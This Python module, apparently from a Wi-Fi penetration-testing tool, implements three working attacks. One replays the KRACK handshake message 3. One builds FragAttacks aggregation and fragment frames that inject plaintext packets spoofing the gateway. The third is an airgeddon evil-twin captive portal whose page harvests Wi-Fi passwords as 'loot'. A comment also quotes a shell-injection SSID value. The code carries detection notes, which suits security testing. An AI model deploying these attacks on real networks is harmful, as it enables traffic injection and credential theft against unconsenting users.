# SPDX-License-Identifier: Apache-2.0 OR BSD-3-Clause
"""The famous Wi-Fi attacks that were still missing: KRACK, FragAttacks, airgeddon.

Five of the names on the brief were already in the registry and are still there:
``dhcp_starvation``, ``rogue_dhcp``, ``dhcp_flood``, ``udp_flood``, ``forged_dhcp_release``
— whose label has said *RELEASE / DECLINE* since it was written, because a DECLINE is the
same forged packet aimed at the pool instead of at a client.  Evil twin, SSID confusion,
the deauthentication flood, beacon flooding and Karma were there too.

What was missing was the three attacks whose *active* half is the whole point of their
fame:

* ``krack_replay`` — CVE-2017-13077 and its relatives.  KRACK is not one frame; it is the
  observation that a client which accepts message 3 of the four-way handshake twice
  installs the same key twice, resetting the nonce and the replay counter with it.  The
  attack replays the message 3 it captured and counts the reinstalls, which is exactly
  what the published tool does.
* ``fragattacks_inject`` — CVE-2020-24588 (A-MSDU aggregation) and 24586/24587 (fragment
  cache and non-contiguous fragments).  The fame is that a *plaintext* frame can be made
  to carry an attacker's IP packet into a connection the client believes is encrypted.
  The attack builds the aggregated and the fragmented shapes and sends them at a client.
* ``airgeddon_portal`` — the captive-portal phishing pipeline airgeddon is known for, run
  either through airgeddon itself when it is installed (its evil-twin menu, or its CLI
  plugin) or through wifipilot's own portal server when it is not, with the report saying
  which one ran.
"""

from __future__ import annotations

import contextlib
import html
import os
import shlex
import shutil
import struct
import subprocess
import time
from typing import Any, Dict, List, Sequence, Tuple

from .. import netproto as np
from .. import netstack as ns
from ..models import AccessPoint, Attempt
from ..util import config_safe
from ..rawtx import RADIOTAP, describe
from .base import AttackContext, AttackOutcome
from .flood2 import _FrameFlood
from .rogue2 import CaptivePortalAttack

__all__ = ["ATTACKS", "META", "NAMES", "REGISTRY"]

#: EAPOL-Key frames, and the bits of the key-information field that tell them apart: a
#: reinstall is only a reinstall if the frame really is message 3, so the parser names
#: each message instead of counting "some EAPOL frames".
KEY_INFO_PAIRWISE = 0x0008
KEY_INFO_INSTALL = 0x0040
KEY_INFO_ACK = 0x0080
KEY_INFO_MIC = 0x0100
KEY_INFO_SECURE = 0x0200

#: LLC/SNAP header that carries EAPOL over a data frame
EAPOL_SNAP = b"\xaa\xaa\x03\x00\x00\x00\x88\x8e"

#: EAPOL-Key message numbers, in the words a report uses
EAPOL_NAMES = {1: "message 1 (ANonce)", 2: "message 2 (SNonce + MIC)",
               3: "message 3 (GTK + install)", 4: "message 4 (ACK)"}


def _strip_radiotap(frame: bytes) -> bytes:
    """The 802.11 frame, whether or not the capture kept the radiotap header.

    ``pcap.iter_frames`` hands back the bytes of the packet as they were written: some
    captures keep radiotap, some were written by a tool that did not.  The version byte
    and a length field that fits inside the frame are enough to tell the two apart
    without guessing.
    """
    if frame[:1] == b"\x00" and len(frame) > 8:
        length = struct.unpack_from("<H", frame, 2)[0]
        if 8 <= length <= len(frame):
            return frame[length:]
    return frame


def _eapol_messages(path: str) -> List[Dict[str, Any]]:
    """Every EAPOL-Key frame in a capture, with the fields a reinstall is built from."""
    from .. import pcap

    out: List[Dict[str, Any]] = []
    for _stamp, buf, start, length in pcap.iter_frames(str(path)):
        frame = _strip_radiotap(bytes(buf[start:start + length]))
        offset = frame.find(EAPOL_SNAP)
        if offset < 0:
            continue
        body = frame[offset + len(EAPOL_SNAP):]
        if len(body) < 6 or body[0] != 0x02 or body[1] != 0x03:      # EAPOL version, key
            continue
        declared = struct.unpack(">H", body[2:4])[0]
        key = body[4:4 + declared]
        if len(key) < 13:
            continue
        key_info = struct.unpack(">H", key[1:3])[0]
        which = 0
        if key_info & KEY_INFO_ACK and key_info & KEY_INFO_MIC and key_info & KEY_INFO_INSTALL:
            which = 3
        elif key_info & KEY_INFO_ACK and key_info & KEY_INFO_MIC:
            which = 1
        elif key_info & KEY_INFO_MIC and not key_info & KEY_INFO_ACK:
            which = 4 if (key_info & KEY_INFO_SECURE) and not key_info & KEY_INFO_PAIRWISE \
                else 2
        out.append({"key_info": key_info, "message": which,
                    "name": EAPOL_NAMES.get(which, "not a handshake message"),
                    "replay_counter": struct.unpack(">Q", key[5:13])[0],
                    "eapol": body[:4 + declared]})
    return out


def _data_frame(bssid: str, client: str, payload: bytes, *, qos: bool = False,
                snap: bool = True, ethertype: int = 0x0800, amsdu: bool = False,
                frag: int = 0, more_fragments: bool = False, seq: int = 0,
                retry: bool = False) -> bytes:
    """An 802.11 data frame from the AP to a client, with the fields the shapes need.

    ``rawtx.build_data`` wraps a payload in LLC/SNAP and chooses the header itself, which
    is right for ordinary injection and useless for these two attacks: FragAttacks is
    *about* the aggregation and fragmentation fields, so this builder exposes them —
    A-MSDU present in the QoS control field, the fragment number and More Fragments bit in
    the header, and no LLC/SNAP at all when the payload is an A-MSDU subframe.
    """
    flags = 0x02                                                  # from DS
    if more_fragments:
        flags |= 0x04
    if retry:
        flags |= 0x08
    control = 0x88 if qos else 0x08                               # data / QoS data
    header = (struct.pack("<BBH", control, flags, 0)
              + ns.mac_to_bytes(client) + ns.mac_to_bytes(bssid) + ns.mac_to_bytes(bssid)
              + struct.pack("<H", ((seq & 0x0FFF) << 4) | (frag & 0x0F)))
    if qos:
        header += struct.pack("<B", 0x80 if amsdu else 0x00) + b"\x00"
    body = payload if not snap else b"\xaa\xaa\x03\x00\x00\x00" \
        + struct.pack(">H", ethertype) + payload
    return RADIOTAP + header + body


class KrackReplayAttack(_FrameFlood):
    """KRACK: replay the handshake's message 3 and put the key back in the lock.

    The four-way handshake is what makes a Wi-Fi key *fresh*: the AP sends a nonce, the
    client answers with its own, the AP sends the key material and the client installs it.
    KRACK is the discovery that the third message may be replayed — the client that
    receives it again reinstalls the *same* key, and installing a key resets its nonce and
    its replay counter.  From there the attacker replays frames the client has already
    accepted, or (with message 3's key data) writes into the connection.

    The attack takes the message 3 the session captured, replays it at a chosen rate, and
    reports how many reinstalls the client's own behaviour implies.  It needs the
    handshake, and it says so when it does not have one: an invented message 3 is not a
    KRACK test, it is a beacon.
    """

    name = "krack_replay"
    label = "KRACK key reinstallation (CVE-2017-13077 playback)"
    tool = "wifipilot rawtx.py (message 3 replayed from the captured handshake)"
    description = (
        "Replay message 3 of the four-way handshake at the client, over and over.  A "
        "client that installs the key on every copy resets its nonce and replay counter "
        "with it, which is the KRACK condition: the fix is a client and AP patch that "
        "ignores a retransmitted message 3, and the test is whether the reinstall still "
        "happens.")
    category = "dos"
    noise = "loud"
    impact = "degraded"
    frames_per_round = 6
    demo_rate = 120
    warning = ("message 3 is being replayed at the client: a client that is affected will "
               "reset its key state, so its traffic breaks for as long as this runs")
    finding_title = "Client reinstalls the pairwise key on a replayed message 3"
    finding_severity = "high"
    finding_detail = (
        "Message 3 of the four-way handshake was replayed at the client.  A client that "
        "installs a fresh pairwise key for every copy loses its nonce and replay state "
        "with each install — the KRACK condition — and the mitigation is the vendor patch "
        "that ignores a repeated message 3.  Because the replay needs a captured "
        "handshake, the finding names the capture it came from.")
    deliverable = "the finding (does the client reinstall, and is it patched?)"

    detection = ("message 3 retransmitted from a station that is not the AP: a WIDS with "
                 "EAPOL sequencing sees the duplicate, and a client that logs its own "
                 "handshakes sees the reinstall")

    def applies(self, ap: AccessPoint) -> bool:
        return True

    def copies(self, ctx: AttackContext, ap: AccessPoint) -> List[Dict[str, Any]]:
        """Every captured message 3, with the capture it came from."""
        out: List[Dict[str, Any]] = []
        for capture in [*ap.captures, *ctx.session.all_captures()]:
            path = getattr(capture, "path", "") or ""
            if not path or not os.path.exists(path) \
                    or not path.endswith((".pcap", ".cap", ".pcapng")):
                continue
            for entry in _eapol_messages(path):
                if entry["message"] == 3:
                    entry["capture"] = path
                    out.append(entry)
        return out

    def frames(self, ctx: AttackContext, ap: AccessPoint, round_index: int
               ) -> Sequence[bytes]:
        thirds = self.copies(ctx, ap)
        if not thirds:
            return []
        clients = sorted(ap.clients) or ["ff:ff:ff:ff:ff:ff"]
        client = clients[round_index % len(clients)]
        entry = thirds[round_index % len(thirds)]
        # the replay is byte-for-byte the captured EAPOL-Key, in a QoS data frame from the
        # AP address to the client: retransmissions of message 3 are legal, and that is
        # exactly why the attack works
        return [_data_frame(ap.bssid, client, entry["eapol"], qos=True, snap=True,
                            ethertype=0x888E, retry=True, seq=round_index & 0x0FFF)]

    def preflight(self, ctx: AttackContext, ap: AccessPoint) -> str:
        if ctx.demo:
            return ""
        if not self.copies(ctx, ap):
            return ("no four-way handshake message 3 in the session: KRACK replays "
                    "message 3, and there is nothing to replay until a handshake is "
                    "captured")
        return ""

    def _demo(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
              seconds: float) -> AttackOutcome:
        sent = failed = 0
        started = time.time()
        step = 0
        while time.time() - started < min(seconds, 8.0) and not ctx.want_stop():
            step += 1
            sent += self.demo_rate // 8 + step * 3
            ctx.progress(f"{self.label} on {ap.display_name}", kind="attack", bssid=ap.bssid,
                         percent=min(95, step * 20),
                         detail=f"{sent:,} replayed message(s) (simulated)")
            time.sleep(0.25)
        return self._finish(ctx, ap, attempt, sent, failed, time.time() - started, True)


class FragAttacksInjectAttack(_FrameFlood):
    """FragAttacks: aggregate a plaintext frame into a connection, or fragment one in.

    CVE-2020-24588 is the aggregation flaw: a client that accepts an A-MSDU in a frame that
    was not encrypted lets an attacker put a whole IP packet inside it, with a source
    address of the gateway, and the client's stack delivers it.  CVE-2020-24586 and
    24587 are the fragmentation pair: the first fragment of a frame is cached and
    reassembled with the rest of a *different* frame, or non-contiguous fragments are
    accepted, so a plaintext fragment completes an encrypted one.

    The attack builds both shapes with real bytes — a QoS data frame with the A-MSDU
    present bit and a subframe whose source is the gateway's address, and a fragmented
    sequence whose first fragment is plaintext with More Fragments set — and sends them at
    a client the session has seen.  Whether the client accepts them is the finding, and
    the frames are the evidence.
    """

    name = "fragattacks_inject"
    label = "FragAttacks plaintext injection (CVE-2020-24588/24586/24587)"
    tool = "wifipilot rawtx.py (A-MSDU and fragment-cache shapes)"
    description = (
        "Inject a plaintext IP packet into a client's connection: an 802.11 QoS data "
        "frame with A-MSDU aggregation present, carrying a subframe whose source address "
        "is the gateway and whose payload is a DNS query the client will answer, followed "
        "by the fragmentation shapes (plaintext first fragment with More Fragments set, "
        "then non-contiguous fragments) the other two flaws are built on.  A patched "
        "client drops all of them; a client with the bug delivers the packet as if the "
        "gateway had sent it.")
    category = "dos"
    noise = "loud"
    impact = "degraded"
    frames_per_round = 6
    demo_rate = 90
    warning = ("plaintext frames are being injected at a client: an affected client will "
               "act on packets its AP never sent")
    finding_title = "Client accepts a plaintext A-MSDU or fragmented injection"
    finding_severity = "high"
    finding_detail = (
        "Aggregated (CVE-2020-24588) and fragmented (CVE-2020-24586/24587) plaintext "
        "frames were sent at a client whose connection is encrypted.  A client that "
        "accepts them delivers the injected packet to its own stack with the gateway's "
        "source address, which defeats Wi-Fi encryption for the attacker's traffic.  The "
        "mitigation is the client's vendor patch (or 802.11w plus a patched driver); the "
        "finding names the client and the frames that were accepted.")
    deliverable = "the finding (which client, and which shape it accepted)"

    detection = ("plaintext aggregation and fragment sequences on a channel whose clients "
                 "are encrypted: a sniffer sees the A-MSDU present bit on an unencrypted "
                 "frame, which the standard says cannot happen")

    def applies(self, ap: AccessPoint) -> bool:
        return True

    def gateway(self, ctx: AttackContext, ap: AccessPoint) -> str:
        """The MAC the injected packet claims: the gateway if the config names one."""
        from ..rawtx import mac_norm

        candidate = getattr(ctx.config, "gateway_mac", "") or ""
        if candidate:
            return mac_norm(candidate) or candidate
        return ap.bssid

    def addresses(self, ctx: AttackContext, ap: AccessPoint,
                  client: str) -> Tuple[str, str]:
        """The source and destination the injected packet claims, as IP addresses.

        The source is the gateway the client already trusts — that is the whole point of
        the injection — and the destination is the client's own address on the same
        subnet, derived from its station address when the session does not know it.
        """
        gateway = getattr(ctx.config, "gateway_ip", "") or "192.168.1.1"
        octets = str(gateway).split(".")
        prefix = ".".join(octets[:3]) if len(octets) == 4 else "192.168.1"
        last = int(str(client).split(":")[-1], 16) or 42
        return str(gateway), f"{prefix}.{max(2, last)}"

    def amsdu_frame(self, ctx: AttackContext, ap: AccessPoint, client: str) -> bytes:
        """One A-MSDU subframe: DA, SA, length, then LLC/SNAP and the injected packet."""
        gateway = self.gateway(ctx, ap)
        source, destination = self.addresses(ctx, ap, client)
        packet = ns.ipv4_packet(source, destination, 17,
                                np.dns_query("portal-check.invalid"), ttl=2)
        llc = b"\xaa\xaa\x03\x00\x00\x00\x08\x00" + packet
        subframe = ns.mac_to_bytes(client) + ns.mac_to_bytes(gateway) \
            + struct.pack(">H", len(llc)) + llc
        return _data_frame(ap.bssid, client, subframe, qos=True, snap=False, amsdu=True)

    def fragment_frames(self, ctx: AttackContext, ap: AccessPoint,
                        client: str) -> List[bytes]:
        """The fragment shapes: a plaintext first fragment, then the rest of the sequence.

        CVE-2020-24586 is the cache: the first fragment of a frame is kept and completed by
        the fragments of another, so fragment 0 is sent in the clear and the sequence is
        continued with the number of a frame that was encrypted.  Non-contiguous numbering
        is the 24587 shape, and it is what the last frame tests.
        """
        source, destination = self.addresses(ctx, ap, client)
        packet = ns.ipv4_packet(source, destination, 17,
                                np.dns_query("fragment-check.invalid"), ttl=2)
        chunks = [packet[index:index + 24] for index in range(0, len(packet), 24)] or [b""]
        out: List[bytes] = []
        for index, chunk in enumerate(chunks[:4]):
            out.append(_data_frame(ap.bssid, client, chunk, qos=False, snap=False, frag=index,
                                   more_fragments=index < len(chunks) - 1, seq=0x0AAA))
        # the non-contiguous shape: fragment 0, then fragment 3 — the gap is what a
        # correct reassembly refuses and the vulnerable one does not
        out.append(_data_frame(ap.bssid, client, chunks[0], qos=False, snap=False, frag=0,
                               more_fragments=True, seq=0x0BBB))
        out.append(_data_frame(ap.bssid, client,
                               chunks[min(3, len(chunks) - 1)], qos=False, snap=False,
                               frag=3, seq=0x0BBB))
        return out

    def frames(self, ctx: AttackContext, ap: AccessPoint, round_index: int
               ) -> Sequence[bytes]:
        clients = sorted(ap.clients) or ["ff:ff:ff:ff:ff:ff"]
        client = clients[round_index % len(clients)]
        return [self.amsdu_frame(ctx, ap, client), *self.fragment_frames(ctx, ap, client)]

    def preflight(self, ctx: AttackContext, ap: AccessPoint) -> str:
        if not ap.clients and not ctx.demo:
            return ("no client on this access point: the injection is aimed at a station "
                    "that is on the air, and there is nothing to aim it at")
        return ""

    def _demo(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
              seconds: float) -> AttackOutcome:
        frames = list(self.frames(ctx, ap, 0))
        shapes = describe(frames)
        sent = failure = 0
        started = time.time()
        step = 0
        while time.time() - started < min(seconds, 6.0) and not ctx.want_stop():
            step += 1
            sent += len(frames)
            ctx.progress(f"{self.label} on {ap.display_name}", kind="attack", bssid=ap.bssid,
                         percent=min(95, step * 20),
                         detail=f"{sent} injection frame(s) (simulated)")
            time.sleep(0.25)
        note = "shapes: " + ", ".join(name for name, _size in shapes[:4])
        outcome = self._finish(ctx, ap, attempt, sent, failure, time.time() - started, True,
                               note=note)
        extra = outcome.extra or {}
        extra.update({"shapes": [{"frame": name, "bytes": size} for name, size in shapes],
                      "client": (sorted(ap.clients) or ["ff:ff:ff:ff:ff:ff"])[0],
                      "gateway_source": self.gateway(ctx, ap)})
        outcome.extra = extra
        return outcome


class AirgeddonPortalAttack(CaptivePortalAttack):
    """Airgeddon's captive-portal phishing pipeline, run from here.

    Airgeddon is the tool the name is attached to: hostapd for the twin, dnsmasq for the
    blackhole, a web server for the portal, a deauth to keep clients away from the real AP,
    and a handshake to check the password a visitor submits.  It is also a menu-driven
    program — the maintainers say so in as many words — so an attack that pretends to
    drive it non-interactively would be theatre.

    What this attack does is the honest version of both halves: it prepares the whole
    pipeline (the twin's hostapd configuration, the DNS blackhole, the portal document
    root, and the handshake file the check needs), and then

    * if airgeddon is installed, starts it in a tmux session with the workspace in place
      and records the session name and the menu path for the operator (evil twin, then
      captive portal), handing the target to airgeddon's own CLI plugin when that plugin
      is installed; and
    * if it is not installed, serves wifipilot's own portal instead, and says in the
      report that this is what ran.

    Either way the deliverable is the same: what a visitor submits, written to the
    session's loot directory, and a finding that names the fields they gave away.
    """

    name = "airgeddon_portal"
    label = "Airgeddon captive portal phishing (evil twin + portal)"
    tool = "airgeddon (evil twin menu / CLI plugin) or wifipilot's portal server"
    description = (
        "Run the evil-twin captive portal pipeline airgeddon is known for: a twin of the "
        "target's SSID, a DNS blackhole that sends every name to the portal, a portal page "
        "that asks for the Wi-Fi password, and a check of that password against the "
        "captured handshake.  When airgeddon is installed the workspace is prepared for it "
        "and it is started in a tmux session (its evil-twin menu, then the captive portal "
        "entry); when it is not, wifipilot's own portal serves the page.  The report says "
        "which one ran.")
    category = "rogue"
    noise = "loud"
    impact = "loot"

    detection = ("a second access point with the target's name plus a portal page and a "
                 "DNS blackhole: the twin shows up in any site survey, and the portal's "
                 "DNS answers are visible to the client")

    #: where distributions and source installs put the script
    LOCATIONS = ("/usr/share/airgeddon/airgeddon.sh", "/opt/airgeddon/airgeddon.sh",
                 "/usr/local/share/airgeddon/airgeddon.sh")

    def airgeddon(self) -> str:
        """The airgeddon script on this system, or ``""``."""
        found = shutil.which("airgeddon") or shutil.which("airgeddon.sh")
        if found:
            return found
        for path in self.LOCATIONS:
            if os.path.exists(path):
                return path
        return ""

    def tmux(self) -> str:
        """A terminal airgeddon can be driven in: tmux, or nothing."""
        return shutil.which("tmux") or ""

    def workspace(self, ctx: AttackContext, ap: AccessPoint) -> Dict[str, str]:
        """Write the pipeline's files: hostapd config, dnsmasq config, portal root.

        These are the pieces airgeddon builds by hand: ``hostapd.conf`` for the twin,
        ``dnsmasq.conf`` with the address wildcard that blackholes every name, and a
        document root holding the portal page the visitor's submission is written by.
        """
        root = os.path.join(ctx.session.state_dir, "airgeddon", ap.bssid.replace(":", ""))
        os.makedirs(root, exist_ok=True)
        portal = os.path.join(root, "portal")
        os.makedirs(portal, exist_ok=True)
        # The SSID is attacker-controlled bytes: a newline in it would turn
        # into extra hostapd directives below, and markup in it would be
        # served unescaped by the portal page.  One sanitised twin name for
        # every file in the workspace (hostapd could not serve the control
        # characters faithfully anyway).
        ssid = config_safe(ap.essid, maxlen=32, fallback="FreeWiFi")
        hostapd = os.path.join(root, "hostapd.conf")
        with open(hostapd, "w", encoding="utf-8") as handle:
            handle.write(
                f"# the twin of {ssid} ({ap.bssid}), channel {ap.channel or 1}\n"
                f"interface={ctx.monitor or 'wlan0'}\ndriver=nl80211\nssid={ssid}\n"
                f"channel={ap.channel or 1}\nhw_mode=g\nignore_broadcast_ssid=0\n"
                "auth_algs=1\nwpa=0\n# open: the portal is the lock\n")
        dnsmasq = os.path.join(root, "dnsmasq.conf")
        gateway = getattr(ctx.config, "gateway_ip", "") or "192.168.66.1"
        with open(dnsmasq, "w", encoding="utf-8") as handle:
            handle.write(
                "# every name answers with the portal: airgeddon's DNS blackhole\n"
                f"interface={ctx.monitor or 'wlan0'}\n"
                "dhcp-range=192.168.66.10,192.168.66.200,8h\n"
                f"dhcp-option=3,{gateway}\ndhcp-option=6,{gateway}\n"
                f"address=/#/{gateway}\n")
        with open(os.path.join(portal, "index.html"), "w", encoding="utf-8") as handle:
            handle.write(
                f"<!doctype html><title>{html.escape(ssid)}</title>\n"
                f"<h1>Sign in to {html.escape(ssid)}</h1>\n"
                "<form method=post action=/submit>"
                "<input name=password type=password placeholder='Wi-Fi password'>"
                "<button>Connect</button></form>\n")
        return {"root": root, "hostapd": hostapd, "dnsmasq": dnsmasq, "portal": portal,
                "ssid": ssid, "gateway": gateway}

    def handshake(self, ap: AccessPoint) -> str:
        """The handshake airgeddon checks a submitted password against, if there is one."""
        for capture in ap.captures:
            path = getattr(capture, "path", "") or ""
            if path and os.path.exists(path):
                return path
        return ""

    def launch_airgeddon(self, ctx: AttackContext, ap: AccessPoint,
                         workspace: Dict[str, str]) -> Dict[str, Any]:
        """Start airgeddon in tmux with the workspace prepared, and report how.

        Airgeddon is menu-driven by design, so the launch is what an operator would do by
        hand: a tmux session on the machine, the script running in it, and the parameters
        this attack knows written next to it so the menu can be walked (evil twin, then
        captive portal) with the right SSID, channel and handshake.
        """
        script = self.airgeddon()
        session = f"wifipilot-portal-{ap.bssid.replace(':', '')[:6]}"
        plugin = os.path.join(os.path.dirname(script), "airgeddon_cli.sh")
        # tmux runs this string through a shell, and the ESSID in it is
        # attacker-controlled: repr() quoting would let a hostile SSID such
        # as  x";$(reboot);"  break out into arbitrary commands.  Every
        # interpolated value goes through shlex.quote, no exceptions.
        command = f"bash {shlex.quote(script)}"
        if os.path.exists(plugin):
            command = (
                f"bash {shlex.quote(script)} --plugin {shlex.quote(plugin)} "
                f"--interface {shlex.quote(ctx.monitor or 'wlan0')} "
                f"--essid {shlex.quote(workspace['ssid'])} "
                f"--bssid {shlex.quote(ap.bssid)} "
                f"--channel {int(ap.channel or 1)}")
        runner = self.tmux()
        if not runner:
            return {"launched": False,
                    "reason": "no tmux on this system to drive airgeddon's menus",
                    "command": command}
        try:
            subprocess.run([runner, "new-session", "-d", "-s", session, command],
                           check=False, capture_output=True, timeout=10)
        except (OSError, subprocess.SubprocessError) as exc:
            return {"launched": False, "reason": f"tmux refused the session: {exc}",
                    "command": command}
        return {"launched": True, "session": session, "command": command,
                "menu": "Evil Twin attacks (7) -> Captive portal (9)",
                "workspace": workspace["root"],
                "handshake": self.handshake(ap),
                "note": ("airgeddon is menu-driven by design; the workspace next to the "
                         "session holds the hostapd, dnsmasq and portal files it asks for")}

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = ctx.session.start_attempt(self.name, ap.bssid, tool=self.tool)
        workspace = self.workspace(ctx, ap)
        script = self.airgeddon()
        launch: Dict[str, Any] = {"launched": False, "reason": "airgeddon is not installed"}
        if script and not ctx.demo:
            launch = self.launch_airgeddon(ctx, ap, workspace)
        if launch.get("launched"):
            detail = (f"airgeddon found at {script}; started in tmux session "
                      f"{launch['session']} with the workspace at {workspace['root']}.  "
                      f"Menu path: {launch['menu']}; handshake "
                      f"{launch.get('handshake') or 'none captured yet'}")
            return self._finish(ctx, ap, attempt,
                                f"airgeddon started (session {launch['session']})", detail,
                                {**launch, "script": script,
                                 "category": self.category, "noise": self.noise,
                                 "impact": self.impact, "finding": self.label},
                                severity="info", finding=False)
        # no airgeddon (or demo mode): serve our own portal, which is the same attack and
        # produces the same deliverable, and say that this is what ran
        outcome = super().run(ctx, ap)
        with contextlib.suppress(Exception):
            extra = outcome.extra or {}
            extra.update({
                "airgeddon": script,
                "airgeddon_started": bool(launch.get("launched")),
                "path": "airgeddon not started" if script else "wifipilot portal server",
                "workspace": workspace["root"],
                "pipeline": {"hostapd": workspace["hostapd"],
                             "dnsmasq": workspace["dnsmasq"],
                             "portal": workspace["portal"]},
                "note": (f"airgeddon is {'installed at ' + script if script else 'not installed'}"
                         f"; the portal served here is wifipilot's own, and the twin's "
                         f"hostapd/dnsmasq/portal files are ready in {workspace['root']}")})
            outcome.extra = extra
        return outcome


# --------------------------------------------------------------------------- #
# registry
# --------------------------------------------------------------------------- #

ATTACKS: List[type] = [KrackReplayAttack, FragAttacksInjectAttack, AirgeddonPortalAttack]

NAMES: List[str] = [cls.name for cls in ATTACKS]

#: metadata for the registry: the four fields the catalogue and the docs need
META: Dict[str, Dict[str, str]] = {}
for _cls in ATTACKS:
    META[_cls.name] = {"category": getattr(_cls, "category", "rogue"),
                       "noise": getattr(_cls, "noise", "loud"),
                       "impact": getattr(_cls, "impact", "degraded"),
                       "detection": getattr(_cls, "detection", "") or
                       "the frames on the channel"}

REGISTRY = [(name, META[name], cls) for name, cls in zip(NAMES, ATTACKS)]
